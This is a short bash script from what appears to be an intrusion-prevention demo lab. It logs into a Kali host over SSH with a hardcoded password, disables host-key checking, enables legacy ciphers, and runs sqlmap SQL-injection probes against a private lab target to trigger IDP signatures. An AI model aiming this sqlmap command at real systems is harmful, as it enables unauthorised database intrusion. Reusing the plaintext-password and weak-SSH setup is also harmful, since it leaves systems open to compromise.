#!/bin/bash
# SQL Injection attack from Kali using sqlmap
# Triggers: HTTP:SQL:INJ:* and HTTP:INVALID:* IDP signatures

SSH_OPTS="-o StrictHostKeyChecking=no -oKexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes256-cbc,aes128-cbc"
KALI="100.123.38.1"
TARGET="192.168.20.2"

echo "=== SQL Injection Attack — sqlmap ==="
echo "Attacker : Kali (192.168.10.2)"
echo "Target   : Linux (${TARGET}:80/items?id=1)"
echo "Tool     : sqlmap"
echo ""
echo "WITHOUT IDP: sqlmap probes the parameter and enumerates injection points"
echo "WITH IDP:    every probe gets a connection reset — sqlmap gives up"
echo ""
echo "Starting SQL injection probe..."
echo ""

sshpass -p 'Juniper!1' ssh $SSH_OPTS jcluser@$KALI \
    "sqlmap -u 'http://${TARGET}/items?id=1' \
     --level=2 --risk=2 \
     --technique=BEUST \
     --batch \
     --timeout=5 \
     --retries=0 \
     --output-dir=/tmp/sqlmap-out \
     2>&1" 2>/dev/null

echo ""
echo "Attack complete. Check IDP hit counters:"
echo "  bash /root/lab/idp-demo/monitor-idp.sh"
